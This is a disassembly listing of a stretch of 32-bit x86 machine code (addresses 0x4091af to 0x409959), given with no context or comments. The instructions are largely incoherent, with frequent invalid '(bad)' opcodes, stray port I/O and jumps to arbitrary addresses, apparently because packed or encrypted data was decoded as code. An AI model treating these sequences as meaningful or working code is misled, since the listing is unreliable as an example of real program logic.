  4091af:	ror    DWORD PTR [esi*1+0x432879a3],0x42
  4091b7:	(bad)  
  4091b8:	jg     0x40919b
  4091ba:	mov    esi,0x37c70753
  4091bf:	outs   dx,DWORD PTR ds:[esi]
  4091c0:	out    dx,al
  4091c1:	shl    DWORD PTR [edx],1
  4091c3:	push   cs
  4091c4:	faddp  st(2),st
  4091c6:	sub    edx,edi
  4091c8:	fisttp QWORD PTR [esi-0x28dd8af6]
  4091ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091cf:	or     DWORD PTR [ecx],eax
  4091d1:	ss ror bl,0x5a
  4091d5:	push   eax
  4091d6:	and    eax,0x1c72ae50
  4091db:	and    dh,BYTE PTR [ebp+eiz*4+0xd9f7bab]
  4091e2:	adc    ecx,DWORD PTR [edx+edi*2]
  4091e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091e6:	dec    esi
  4091e7:	mov    WORD PTR [esi],ss
  4091e9:	add    esp,ecx
  4091eb:	(bad)  
  4091ec:	scas   eax,DWORD PTR es:[edi]
  4091ed:	adc    DWORD PTR [esi],edi
  4091ef:	inc    edi
  4091f0:	add    DWORD PTR [edx-0x42],edi
  4091f3:	dec    esp
  4091f4:	iret   
  4091f5:	in     al,dx
  4091f6:	fimul  WORD PTR [eax]
  4091f8:	add    edx,DWORD PTR [ebp-0xf]
  4091fb:	mov    edx,DWORD PTR [ebx-0x2e40b917]
  409201:	(bad)  
  409202:	test   BYTE PTR [ecx],0xe
  409205:	push   ebp
  409206:	aaa    
  409207:	cmp    edi,ebx
  409209:	dec    edx
  40920a:	pop    es
  40920b:	enter  0xcf1e,0xac
  40920f:	xchg   BYTE PTR [ebx+edx*2],cl
  409212:	std    
  409213:	rcr    edi,1
  409215:	outs   dx,DWORD PTR ds:[esi]
  409216:	ss int3 
  409218:	cwde   
  409219:	adc    al,BYTE PTR [ecx]
  40921b:	and    ebp,DWORD PTR [esi-0x7a]
  40921e:	fisubr WORD PTR [edx+0x5df8ea77]
  409224:	mov    ds:0x7b3920e5,eax
  409229:	cmp    DWORD PTR [esi-0x23325805],esi
  40922f:	clc    
  409230:	add    bh,BYTE PTR [eax-0xc4724f6]
  409236:	adc    al,0x8a
  409238:	pop    ds
  409239:	pop    ds
  40923a:	stos   BYTE PTR es:[edi],al
  40923b:	and    eax,0x5bde9902
  409240:	imul   ebx,ebp,0xffffffd6
  409243:	sub    esp,DWORD PTR [esi-0x4c]
  409246:	mov    esp,0xfe14bf1
  40924b:	test   BYTE PTR [edi+0x54],cl
  40924e:	dec    ebx
  40924f:	das    
  409250:	sub    eax,0xdbc0f5b9
  409255:	xlat   BYTE PTR ds:[ebx]
  409256:	sbb    al,0x85
  409258:	in     eax,0xc9
  40925a:	inc    edx
  40925b:	xchg   ecx,eax
  40925c:	push   esi
  40925d:	dec    esp
  40925e:	and    BYTE PTR [eax],ah
  409260:	setnp  bh
  409263:	(bad)  
  409264:	cld    
  409265:	and    DWORD PTR ds:0xf6af330,edi
  40926b:	xchg   ebp,eax
  40926c:	int    0x9f
  40926e:	scas   al,BYTE PTR es:[edi]
  40926f:	inc    ecx
  409270:	cld    
  409271:	adc    al,0xab
  409273:	clc    
  409274:	mov    ebp,0xa70b06cb
  409279:	cdq    
  40927a:	push   edi
  40927b:	pop    edi
  40927c:	icebp  
  40927d:	mov    bh,0x7e
  40927f:	and    ch,al
  409281:	icebp  
  409282:	mov    bh,0x57
  409284:	mov    ch,0x6
  409286:	xchg   ecx,eax
  409287:	mov    ebx,0xcbbfa734
  40928c:	out    0xf8,al
  40928e:	loop   0x409309
  409290:	rcl    ebx,0xed
  409293:	xor    ebp,edi
  409295:	or     edi,DWORD PTR [edx-0xa]
  409298:	sub    ah,BYTE PTR [esi+ebp*2+0x21911957]
  40929f:	dec    esi
  4092a0:	and    cl,BYTE PTR [esi+eax*4]
  4092a3:	mov    esi,0xb29f264a
  4092a8:	mov    bl,0xd4
  4092aa:	in     al,dx
  4092ab:	vsubss xmm0,xmm0,xmm2
  4092af:	ins    BYTE PTR es:[edi],dx
  4092b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092b1:	mov    BYTE PTR [esi+0x7781386e],cl
  4092b7:	rcl    BYTE PTR [edi-0x6a67b108],0x2d
  4092be:	xor    eax,DWORD PTR [ebp+ebx*2+0x26]
  4092c2:	jle    0x409295
  4092c4:	sbb    eax,0xb1bed932
  4092c9:	push   ds
  4092ca:	sub    ah,bl
  4092cc:	arpl   WORD PTR [ebx+0x54267ea4],ax
  4092d2:	cmp    DWORD PTR [edi+0x23],ebp
  4092d5:	xlat   BYTE PTR ds:[ebx]
  4092d6:	dec    esi
  4092d7:	cmp    cl,bh
  4092d9:	adc    BYTE PTR [ebx],bh
  4092db:	adc    BYTE PTR gs:[ebx+0x500158af],ah
  4092e2:	fstp   DWORD PTR [edi]
  4092e4:	pop    ds
  4092e5:	push   ss
  4092e6:	sbb    cl,0x76
  4092e9:	addr16 in al,dx
  4092eb:	loope  0x409352
  4092ed:	add    eax,0x86780967
  4092f2:	ret    
  4092f3:	add    al,0x7c
  4092f5:	aam    0x1d
  4092f7:	repz mov eax,0xb9017e9
  4092fd:	add    DWORD PTR [esi-0x321d8588],edx
  409303:	inc    edx
  409304:	mov    bl,0xc4
  409306:	mov    esi,0x82904305
  40930b:	mov    ah,0x85
  40930d:	push   esp
  40930e:	dec    eax
  40930f:	call   0x3fb874bd
  409314:	ins    DWORD PTR es:[edi],dx
  409315:	scas   eax,DWORD PTR es:[edi]
  409316:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409318:	call   DWORD PTR [esp+edx*4]
  40931b:	icebp  
  40931c:	outs   dx,BYTE PTR ds:[esi]
  40931d:	sbb    dh,ah
  40931f:	cwde   
  409320:	mov    esp,DWORD PTR [edx-0x52]
  409323:	and    eax,0xdbc6332a
  409328:	mov    eax,ds:0x6a23e9fc
  40932d:	or     DWORD PTR [edi+0x40],edx
  409330:	inc    ebx
  409331:	lods   eax,DWORD PTR ds:[esi]
  409332:	fistp  QWORD PTR [ecx-0x70e7734f]
  409338:	leave  
  409339:	add    DWORD PTR cs:[esi+0x9],esp
  40933d:	dec    ecx
  40933e:	daa    
  40933f:	(bad)  
  409340:	pop    eax
  409341:	int    0x59
  409343:	out    0x3f,eax
  409345:	ja     0x4093b8
  409347:	test   DWORD PTR [esi+ebp*8+0x6f1832a9],edi
  40934e:	xlat   BYTE PTR ds:[ebx]
  40934f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409350:	into   
  409351:	pop    edx
  409352:	jecxz  0x409394
  409354:	aas    
  409355:	push   ecx
  409356:	(bad)  
  409357:	js     0x4093c0
  409359:	mov    dh,0xda
  40935b:	repnz adc al,0x5f
  40935e:	jl     0x409320
  409360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409361:	jmp    DWORD PTR gs:[edi+0x8]
  409365:	push   ds
  409366:	in     eax,dx
  409367:	nop
  409368:	scas   eax,DWORD PTR es:[edi]
  409369:	xor    al,BYTE PTR [ebp+0x429ea015]
  40936f:	(bad)  
  409370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409371:	fstp   QWORD PTR [eax]
  409373:	xor    ebx,ebx
  409375:	and    eax,0xbfca0d7f
  40937a:	sub    DWORD PTR [eax-0x7b],esp
  40937d:	pop    ecx
  40937e:	lods   eax,DWORD PTR ds:[esi]
  40937f:	inc    edx
  409380:	mov    BYTE PTR [ebx-0x54],dl
  409383:	retf   0xda2d
  409386:	push   ecx
  409387:	xlat   BYTE PTR cs:[ebx]
  409389:	mov    ch,0xad
  40938b:	cwde   
  40938c:	xchg   ebp,eax
  40938d:	loop   0x4093ee
  40938f:	push   ebp
  409390:	xlat   BYTE PTR ds:[ebx]
  409391:	inc    esi
  409392:	or     ebx,ebp
  409394:	push   esp
  409395:	cmp    eax,0x66914f9a
  40939a:	jno    0x4093cc
  40939c:	fidiv  DWORD PTR [ebp+0x2d]
  40939f:	and    ax,0x949b
  4093a3:	pop    esp
  4093a4:	mov    al,0xa4
  4093a6:	push   0x9d96f956
  4093ab:	lahf   
  4093ac:	sbb    DWORD PTR [ebx],ebp
  4093ae:	mov    eax,0x74f7aaf5
  4093b3:	les    edx,FWORD PTR [esi]
  4093b5:	ret    0x82c6
  4093b8:	imul   ebp,DWORD PTR [esp+edi*2+0x2c602ccd],0x0
  4093c0:	dec    edi
  4093c1:	sbb    al,0x7e
  4093c3:	test   al,ch
  4093c5:	ret    0x69b4
  4093c8:	je     0x40935a
  4093ca:	cdq    
  4093cb:	push   ecx
  4093cc:	adc    DWORD PTR [ebx+0x8e1ff16],esi
  4093d2:	cmp    esi,DWORD PTR [esi]
  4093d4:	or     DWORD PTR [esi],0x216645d3
  4093da:	mov    ah,0x64
  4093dc:	sub    al,0xca
  4093de:	das    
  4093df:	adc    cl,BYTE PTR [edx+0x2cfba362]
  4093e5:	xor    eax,DWORD PTR [ecx-0x78]
  4093e8:	pop    ebx
  4093e9:	adc    ecx,DWORD PTR [ebx+ebp*8+0x7a]
  4093ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ee:	aas    
  4093ef:	sub    al,BYTE PTR [eax+0x51646731]
  4093f5:	dec    eax
  4093f6:	sbb    al,0x82
  4093f8:	jecxz  0x40946f
  4093fa:	dec    esp
  4093fb:	sub    BYTE PTR [edi+0x6d1e15f4],bl
  409401:	call   0xc185b6a1
  409406:	or     BYTE PTR [edx-0x63a004c2],0x4f
  40940d:	jecxz  0x4093be
  40940f:	add    eax,0x1a2232b2
  409414:	aam    0xd7
  409416:	ret    
  409417:	mov    ebp,0xd76523d8
  40941c:	lahf   
  40941d:	mov    al,ds:0x49f28f8b
  409422:	xchg   ebx,eax
  409423:	retf   0xa545
  409426:	mov    ah,0xf2
  409428:	cld    
  409429:	ja     0x4093bc
  40942b:	xlat   BYTE PTR ds:[ebx]
  40942c:	lahf   
  40942d:	test   al,0xdc
  40942f:	pop    ebp
  409430:	dec    ecx
  409431:	ja     0x409463
  409433:	pusha  
  409434:	xchg   edi,eax
  409435:	sbb    al,0x2c
  409437:	and    BYTE PTR [ecx-0x62862764],bl
  40943d:	ja     0x40940e
  40943f:	jb     0x40944b
  409441:	test   BYTE PTR [edi-0x73],cl
  409444:	sbb    ah,cl
  409446:	jno    0x40944b
  409448:	jp     0x4093ed
  40944a:	je     0x40947b
  40944c:	lds    edi,FWORD PTR [edx+0x74]
  40944f:	sahf   
  409450:	retf   0xb030
  409453:	sub    bl,BYTE PTR [edx]
  409455:	jmp    0xd70:0x2d374db8
  40945c:	aaa    
  40945d:	(bad)  
  40945e:	and    bh,ch
  409460:	cmp    eax,0x90f0a46c
  409465:	push   0xfffffffb
  409467:	sub    ecx,DWORD PTR [edx+0x38]
  40946a:	lods   al,BYTE PTR ds:[esi]
  40946b:	arpl   WORD PTR [edx],ax
  40946d:	ret    
  40946e:	outs   dx,BYTE PTR ds:[esi]
  40946f:	sub    bl,dl
  409471:	(bad)  
  409472:	jmp    0xcd31:0x5801ee6f
  409479:	repnz xchg edx,eax
  40947b:	jne    0x4094e0
  40947d:	jno    0x409492
  40947f:	xchg   edi,eax
  409480:	shl    BYTE PTR [eax+ebx*4],1
  409483:	icebp  
  409484:	mov    ds:0xddcdb26a,eax
  409489:	dec    ebp
  40948a:	repz sti 
  40948c:	or     DWORD PTR [eax+0x26],eax
  40948f:	sahf   
  409490:	jne    0x4094ce
  409492:	and    al,0x4e
  409494:	dec    esp
  409495:	pop    es
  409496:	mov    ebx,0x30ca524f
  40949b:	dec    edi
  40949c:	imul   ecx,DWORD PTR [ebx+0x1a105ea2],0x2bbb8898
  4094a6:	push   ds
  4094a7:	fsubr  DWORD PTR [ecx-0x13]
  4094aa:	cmc    
  4094ab:	inc    esp
  4094ac:	push   eax
  4094ad:	lock push es
  4094af:	mov    ah,0x10
  4094b1:	cmp    eax,DWORD PTR [ecx-0x77]
  4094b4:	scas   eax,DWORD PTR es:[edi]
  4094b5:	inc    ebp
  4094b6:	xor    al,0x34
  4094b8:	int3   
  4094b9:	add    eax,0xc58199bb
  4094be:	imul   ebp,edx,0xb064df91
  4094c4:	repnz in al,dx
  4094c6:	inc    edx
  4094c7:	enter  0x6bb7,0x6e
  4094cb:	cdq    
  4094cc:	into   
  4094cd:	hlt    
  4094ce:	(bad)  
  4094cf:	mov    al,ds:0x835ea42a
  4094d4:	add    eax,0xa312c801
  4094d9:	jns    0x40950a
  4094db:	dec    esi
  4094dc:	cmp    al,0xe7
  4094de:	mov    al,cl
  4094e0:	(bad)  
  4094e1:	aaa    
  4094e2:	push   ebx
  4094e3:	xor    BYTE PTR [esi],0x14
  4094e6:	sub    BYTE PTR [eax-0x50],0xe2
  4094ea:	test   DWORD PTR [ebp+0x3c],eax
  4094ed:	or     esp,DWORD PTR [ebp-0x60]
  4094f0:	aaa    
  4094f1:	dec    eax
  4094f2:	pop    eax
  4094f3:	fld    QWORD PTR [edx]
  4094f5:	or     al,0xa4
  4094f7:	mov    dl,0xf2
  4094f9:	stc    
  4094fa:	jmp    0xf60458b4
  4094ff:	imul   ecx,DWORD PTR [esi],0xa6479d47
  409505:	mov    edi,0x517bacbd
  40950a:	pop    ebx
  40950b:	jnp    0x4094b9
  40950d:	push   ebp
  40950e:	(bad)
  409513:	fwait
  409514:	push   cs
  409515:	nop
  409516:	scas   eax,DWORD PTR es:[edi]
  409517:	dec    edi
  409518:	mov    cl,0xd4
  40951a:	fstp   st(1)
  40951c:	aad    0xef
  40951e:	or     esp,DWORD PTR [eax+edi*4]
  409521:	es in  eax,0xfc
  409524:	add    DWORD PTR [edi-0x2b],0xffffff82
  409528:	inc    ecx
  409529:	cs repnz xchg ecx,eax
  40952c:	xor    bh,BYTE PTR [edx-0x759e40e0]
  409532:	xlat   BYTE PTR ds:[ebx]
  409533:	jge    0x4094b7
  409535:	and    al,0x92
  409537:	or     BYTE PTR [esp+esi*2],dl
  40953a:	(bad)  
  40953c:	or     DWORD PTR [ebp*2+0x13921c0c],eax
  409543:	mul    DWORD PTR [esi]
  409545:	xchg   esi,eax
  409546:	and    al,0xa3
  409548:	cmp    BYTE PTR es:[edi-0x2d917c67],dl
  40954f:	test   DWORD PTR [esi-0x201f3824],eax
  409555:	int    0xb0
  409557:	mul    BYTE PTR [ebx+0x74]
  40955a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40955b:	jmp    0x99b1:0x4a6a8eac
  409562:	jg     0x409521
  409564:	inc    esp
  409565:	in     al,0x52
  409567:	bnd jns 0x409514
  40956a:	jb     0x4095ea
  40956c:	pop    ds
  40956d:	and    ch,BYTE PTR [eax+0x68]
  409570:	and    ecx,esp
  409572:	adc    ah,BYTE PTR [esi]
  409574:	jbe    0x40958b
  409576:	adc    ah,BYTE PTR cs:[edi+esi*4+0x2b]
  40957b:	inc    edx
  40957c:	xor    ebp,ecx
  40957e:	sar    al,0x38
  409581:	sbb    BYTE PTR [edi+0x5e],cl
  409584:	imul   eax,DWORD PTR [esi-0x6b],0x5c5fcfd4
  40958b:	pop    edi
  40958c:	aam    0xf1
  40958e:	cmp    DWORD PTR [eax],ebx
  409590:	inc    ebp
  409591:	ds mov ebp,0x8ebfb468
  409597:	outs   dx,DWORD PTR ds:[esi]
  409598:	fld    st(5)
  40959a:	jmp    0x91d0:0x547fcee1
  4095a1:	mov    dl,0x62
  4095a3:	fwait
  4095a4:	jno    0x409539
  4095a6:	push   ds
  4095a7:	add    BYTE PTR [edx-0xca004a],ch
  4095ad:	lock jne 0x40955f
  4095b0:	imul   esi,DWORD PTR [esi-0x71c78986],0x5a150890
  4095ba:	push   edx
  4095bb:	jmp    0x2abec6f5
  4095c0:	arpl   WORD PTR [esi+0x6d621f6f],dx
  4095c6:	stc    
  4095c7:	add    eax,0x4cc1ff97
  4095cc:	sub    BYTE PTR [eax],al
  4095ce:	je     0x409573
  4095d0:	ret    
  4095d1:	stos   DWORD PTR es:[edi],eax
  4095d2:	jno    0x4095c2
  4095d4:	push   eax
  4095d5:	pop    esp
  4095d6:	gs xor ch,0x4f
  4095da:	aad    0x79
  4095dc:	mov    ss,WORD PTR [eax*2+0x3cfe5c7c]
  4095e3:	lods   al,BYTE PTR ds:[esi]
  4095e4:	cmp    al,0x2f
  4095e6:	adc    DWORD PTR [ecx-0x1e],eax
  4095e9:	push   cs
  4095ea:	in     al,0x5c
  4095ec:	mov    al,0x9c
  4095ee:	mov    ch,0xc9
  4095f0:	hlt    
  4095f1:	imul   ebp,DWORD PTR [eax],0x5553e740
  4095f7:	gs (bad) 
  4095f9:	adc    DWORD PTR [eax+esi*8-0x49a1acad],eax
  409600:	ficomp DWORD PTR [ebp-0x3d]
  409603:	and    al,BYTE PTR [edi]
  409605:	jns    0x409680
  409607:	adc    BYTE PTR [eax],0x81
  40960a:	frstor [edi+ecx*4+0x28]
  40960e:	lods   eax,DWORD PTR ds:[esi]
  40960f:	aam    0x41
  409611:	sbb    eax,0x452fbbce
  409616:	out    0x84,eax
  409618:	xor    BYTE PTR [eax-0x48],cl
  40961b:	(bad)  
  40961c:	icebp  
  40961d:	cs iret 
  40961f:	jmp    0x409628
  409621:	leave  
  409622:	or     al,BYTE PTR [edi+ebp*1-0x61537a10]
  409629:	in     eax,dx
  40962a:	popf   
  40962b:	stos   BYTE PTR es:[edi],al
  40962c:	popa   
  40962d:	add    cl,BYTE PTR [ebp+0x1e25173b]
  409633:	test   BYTE PTR [edx],0x7c
  409636:	inc    edx
  409637:	jg     0x409662
  409639:	(bad)  
  40963a:	shr    BYTE PTR [ebx-0x7a9f122a],0xd7
  409641:	jb     0x40961d
  409643:	sbb    DWORD PTR [ebp+ebp*4+0x13e216a1],ebp
  40964a:	jg     0x409638
  40964c:	push   ecx
  40964d:	cmp    al,0x77
  40964f:	test   BYTE PTR [edi+0x7],dh
  409652:	fldcw  WORD PTR [esi-0x740a522c]
  409658:	sbb    eax,0x39645f7b
  40965d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40965e:	xlat   BYTE PTR ds:[ebx]
  40965f:	iret   
  409660:	in     eax,dx
  409661:	xchg   BYTE PTR ds:0xf8254a75,cl
  409667:	mov    eax,0xffa12571
  40966c:	mov    esp,0xe296f9d3
  409671:	lock test eax,0xe32409b1
  409677:	leave  
  409678:	pop    edi
  409679:	push   cs
  40967a:	jge    0x40967e
  40967c:	sub    edx,DWORD PTR [ecx]
  40967e:	nop
  40967f:	adc    esp,DWORD PTR ds:[ecx+0x38]
  409683:	adc    al,0xc5
  409685:	ins    BYTE PTR es:[edi],dx
  409686:	mov    edx,0x303531c9
  40968b:	nop
  40968c:	lods   eax,DWORD PTR ds:[esi]
  40968d:	push   ss
  40968e:	aaa    
  40968f:	add    eax,0xffdb89a2
  409694:	mov    al,ds:0x9954b917
  409699:	xlat   BYTE PTR ds:[ebx]
  40969a:	mov    eax,ds:0x38253649
  40969f:	adc    edx,DWORD PTR [ecx]
  4096a1:	sub    dl,BYTE PTR [ebx]
  4096a3:	inc    eax
  4096a4:	in     al,0xb6
  4096a6:	rcr    esp,1
  4096a8:	push   ecx
  4096a9:	xchg   edx,eax
  4096aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ab:	mov    eax,0xca3138a2
  4096b0:	pop    es
  4096b1:	ins    DWORD PTR es:[edi],dx
  4096b2:	iret   
  4096b3:	out    0x1a,eax
  4096b5:	aad    0x2
  4096b7:	outs   dx,DWORD PTR ds:[esi]
  4096b8:	sbb    BYTE PTR [eax+0x42842ea],0x4d
  4096bf:	sbb    dh,BYTE PTR [ebx-0x49606ffe]
  4096c5:	adc    DWORD PTR [bx+di+0x43],esp
  4096c9:	pop    ecx
  4096ca:	mov    WORD PTR [edx],fs
  4096cc:	fwait
  4096cd:	adc    ecx,DWORD PTR [eax]
  4096cf:	sbb    BYTE PTR [edi],0x28
  4096d2:	or     ebp,edx
  4096d4:	ins    BYTE PTR es:[edi],dx
  4096d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096d6:	pop    ds
  4096d7:	pusha  
  4096d8:	jecxz  0x4096f3
  4096da:	jns    0x409722
  4096dc:	pop    edx
  4096dd:	mov    edi,0xf93e7190
  4096e2:	or     bl,dh
  4096e4:	cmc    
  4096e5:	dec    esp
  4096e6:	xchg   ecx,eax
  4096e7:	shl    BYTE PTR [ebx],1
  4096e9:	les    edx,FWORD PTR [ebx+0x4fcfd9d9]
  4096ef:	loope  0x409738
  4096f1:	test   al,0x1a
  4096f3:	fprem1 
  4096f5:	rol    BYTE PTR [eax+0x2e],cl
  4096f8:	jae    0x40969b
  4096fa:	outs   dx,BYTE PTR ds:[esi]
  4096fb:	scas   al,BYTE PTR es:[edi]
  4096fc:	loopne 0x409737
  4096fe:	stc    
  4096ff:	popa   
  409700:	lds    ecx,FWORD PTR [ecx-0xc75a4b3]
  409706:	cmp    DWORD PTR [esi-0xee1d986],0x5211092c
  409710:	out    0x52,al
  409712:	or     BYTE PTR [edx+ecx*1],cl
  409715:	pop    edx
  409716:	mov    al,ds:0x2c08b51
  40971b:	add    ch,BYTE PTR [esi]
  40971d:	loope  0x4096dc
  40971f:	sbb    eax,0xa33c03fd
  409724:	mov    DWORD PTR [edx+eiz*8],edx
  409727:	das    
  409728:	imul   ebp,DWORD PTR [ebx-0x45],0xbd9352ab
  40972f:	mov    cl,0x3d
  409731:	inc    edi
  409732:	ret    0x4aa7
  409735:	into   
  409736:	int    0x19
  409738:	std    
  409739:	sbb    eax,DWORD PTR [ebp+ebp*2+0x4c]
  40973d:	jl     0x40972f
  40973f:	fnsave [ebp+0x2171dee6]
  409745:	int    0xe0
  409747:	mov    ch,0xb4
  409749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40974a:	jg     0x4096e8
  40974c:	mov    fs,WORD PTR [ebp-0x3e]
  40974f:	aam    0x2
  409751:	fcomip st,st(4)
  409753:	mov    dh,0x8e
  409755:	data16 outs dx,BYTE PTR ds:[esi]
  409757:	das    
  409758:	and    BYTE PTR [ecx+0x4de77eca],bl
  40975e:	mov    dh,0x2e
  409760:	sar    BYTE PTR ds:0x13ba2c97,0x2
  409767:	and    al,0xde
  409769:	mov    WORD PTR [eax-0x72],?
  40976c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40976d:	jmp    0x366f6b17
  409772:	test   BYTE PTR [ecx+0x208ae14],ah
  409778:	jp     0x4097a4
  40977a:	fwait
  40977b:	jg     0x4097b3
  40977d:	pop    eax
  40977e:	cmp    BYTE PTR [edx-0x6f],bh
  409781:	dec    ebp
  409782:	jmp    0x62bc2c3d
  409787:	shl    esi,0xd2
  40978a:	mov    cl,0xf8
  40978c:	retf   
  40978d:	fist   WORD PTR [esi+0x5e]
  409790:	lea    ecx,[edi-0x36f2b82c]
  409796:	jl     0x4097ce
  409798:	out    dx,al
  409799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40979a:	stos   BYTE PTR es:[edi],al
  40979b:	lds    edi,FWORD PTR [ecx+0x6a900253]
  4097a1:	cmp    bl,BYTE PTR [edi-0x30]
  4097a4:	retf   
  4097a5:	lds    ebp,FWORD PTR [ebp+0x3f65a740]
  4097ab:	adc    DWORD PTR [ebx],0xffffff9d
  4097ae:	in     al,0x39
  4097b0:	cmp    BYTE PTR [ebx],al
  4097b2:	adc    al,0x29
  4097b4:	dec    edx
  4097b5:	xor    ah,bh
  4097b7:	jecxz  0x409819
  4097b9:	inc    edx
  4097ba:	stc    
  4097bb:	jno    0x4097d5
  4097bd:	das    
  4097be:	mov    bh,0x9a
  4097c0:	mov    BYTE PTR [esi+edi*4-0x7096aa2b],cl
  4097c7:	(bad)  
  4097c8:	ds loope 0x40977b
  4097cb:	push   ebp
  4097cc:	or     al,0x16
  4097ce:	dec    edi
  4097cf:	sti    
  4097d0:	(bad)  
  4097d2:	mov    cl,0xc5
  4097d4:	fstp   DWORD PTR [esi-0x5a]
  4097d7:	xlat   BYTE PTR ds:[ebx]
  4097d8:	cmp    al,0xd1
  4097da:	jb     0x4097ea
  4097dc:	shr    DWORD PTR [edx+0x84123cf],0xf5
  4097e3:	inc    ebx
  4097e4:	jmp    0x4097f8
  4097e6:	fs ss (bad) 
  4097ea:	lock and dh,bh
  4097ed:	imul   edi,DWORD PTR [esp+esi*1],0x48cff06b
  4097f4:	leave  
  4097f5:	loop   0x409835
  4097f7:	mov    al,ds:0x72be3156
  4097fc:	push   eax
  4097fd:	cmp    eax,0x41f70ca6
  409802:	jmp    0x7642:0xa16babc9
  409809:	mov    cl,0x1b
  40980b:	lods   al,BYTE PTR ds:[esi]
  40980c:	retf   
  40980d:	sub    al,0x3e
  40980f:	lods   al,BYTE PTR ds:[esi]
  409810:	popf   
  409811:	mov    eax,0xa3b93fe8
  409816:	jo     0x4097af
  409818:	rcl    DWORD PTR [ebx+0x68456516],cl
  40981e:	repz pop edx
  409820:	inc    ebp
  409821:	pop    edx
  409822:	add    DWORD PTR [ecx+0x5e317621],ebx
  409828:	(bad)  
  409829:	out    0xa,eax
  40982b:	jo     0x4097b9
  40982d:	sub    dh,BYTE PTR [ebx-0x4d]
  409830:	xor    eax,0x271112eb
  409835:	call   0x4f63:0xc2c85049
  40983c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40983d:	jns    0x40986c
  40983f:	lea    ebx,[edx]
  409841:	out    dx,eax
  409842:	jp     0x409813
  409844:	inc    ecx
  409845:	sahf   
  409846:	adc    al,0x93
  409848:	sub    eax,0x6c9eb9ea
  40984d:	mov    esp,0xca5fefa
  409852:	scas   al,BYTE PTR es:[edi]
  409853:	push   edx
  409854:	mov    ebp,0xa1f5a183
  409859:	add    al,0x15
  40985b:	rol    DWORD PTR [ecx],0xf
  40985e:	lods   al,BYTE PTR ds:[esi]
  40985f:	dec    ebx
  409860:	inc    ebx
  409861:	scas   eax,DWORD PTR es:[edi]
  409862:	adc    al,0xea
  409864:	ja     0x4098b0
  409866:	test   al,dl
  409868:	in     eax,dx
  409869:	icebp  
  40986a:	push   0x30bc491f
  40986f:	sub    eax,0x5a7b7486
  409874:	add    DWORD PTR [ebp+0x38],ebx
  409877:	or     edi,ecx
  409879:	test   DWORD PTR [ebx-0x31],ecx
  40987c:	je     0x4098ab
  40987e:	shl    DWORD PTR [edi+0x2f],0x10
  409882:	sub    BYTE PTR [ebx-0x26],cl
  409885:	aaa    
  409886:	stos   DWORD PTR es:[edi],eax
  409887:	aad    0x24
  409889:	mov    esp,0x42cc227b
  40988e:	and    BYTE PTR [ebx-0x5a],ch
  409891:	popf   
  409892:	lods   eax,DWORD PTR ds:[esi]
  409893:	mov    esp,0x8b93392c
  409898:	or     ebp,DWORD PTR [eax+0x1f]
  40989b:	inc    ebp
  40989c:	pop    eax
  40989d:	xor    DWORD PTR [ebp+0x64],ebp
  4098a0:	jno    0x409830
  4098a2:	xchg   BYTE PTR [ebp-0x3e],al
  4098a5:	sub    al,0x6e
  4098a7:	loop   0x409917
  4098a9:	jb     0x40984a
  4098ab:	leave  
  4098ac:	into   
  4098ad:	(bad)  
  4098ae:	cmp    al,0x9d
  4098b0:	cdq    
  4098b1:	leave  
  4098b2:	sbb    ebx,edi
  4098b4:	mov    BYTE PTR [esi],bh
  4098b6:	xchg   edi,eax
  4098b7:	jb     0x409895
  4098b9:	and    esi,esp
  4098bb:	sbb    DWORD PTR [edi-0xe8e418e],eax
  4098c1:	inc    esi
  4098c2:	stc    
  4098c3:	(bad)  
  4098c4:	mov    bl,0x6c
  4098c6:	(bad)
  4098ca:	outs   dx,DWORD PTR ds:[esi]
  4098cb:	repz in al,0x68
  4098ce:	or     bh,0x7c
  4098d1:	inc    ebx
  4098d2:	(bad)  
  4098d3:	or     eax,0x3d855316
  4098d8:	xor    cl,BYTE PTR [eax]
  4098da:	adc    DWORD PTR [ecx],esi
  4098dc:	fwait
  4098dd:	mov    WORD PTR [edx],?
  4098df:	das    
  4098e0:	xchg   ecx,eax
  4098e1:	test   DWORD PTR [eax-0x69],esi
  4098e4:	dec    ecx
  4098e5:	or     esp,DWORD PTR [ebx]
  4098e7:	imul   esp,DWORD PTR [ebx-0xf],0x5e7bf44d
  4098ee:	add    esi,DWORD PTR [edi+0x33]
  4098f1:	(bad)  
  4098f2:	ja     0x409929
  4098f4:	sub    BYTE PTR [edx+0x1b],bl
  4098f7:	pop    es
  4098f8:	add    ecx,esi
  4098fa:	lahf   
  4098fb:	push   DWORD PTR [ebp+0x4e]
  4098fe:	mov    ch,0x24
  409900:	push   ds
  409901:	xchg   DWORD PTR [ebx-0x43c498],esi
  409907:	(bad)  
  409908:	pushw  ss
  40990a:	stos   BYTE PTR es:[edi],al
  40990b:	aaa    
  40990c:	push   0x92c360e
  409911:	pop    ebx
  409912:	xchg   ebp,eax
  409913:	test   eax,0x6812b14f
  409918:	mov    esi,0xf754bae1
  40991d:	push   ecx
  40991e:	leavew 
  409920:	xchg   esi,eax
  409921:	imul   ebx,DWORD PTR [edx-0x6b871e14],0xa9f26cc3
  40992b:	das    
  40992c:	loope  0x409941
  40992e:	pop    esi
  40992f:	inc    esi
  409930:	cmp    al,0x56
  409932:	mov    DWORD PTR [esi+0x31542dfa],0xe16aee70
  40993c:	jns    0x4098d9
  40993e:	inc    ecx
  40993f:	icebp  
  409940:	mov    ds,WORD PTR [ecx]
  409942:	mov    esi,DWORD PTR [edi+0x6f27fad0]
  409948:	xor    al,0x7a
  40994a:	jo     0x40992e
  40994c:	inc    esi
  40994d:	inc    DWORD PTR [ebx+edx*1-0x66a136e2]
  409954:	or     eax,0xa9cbb4f4
  409959:	nop
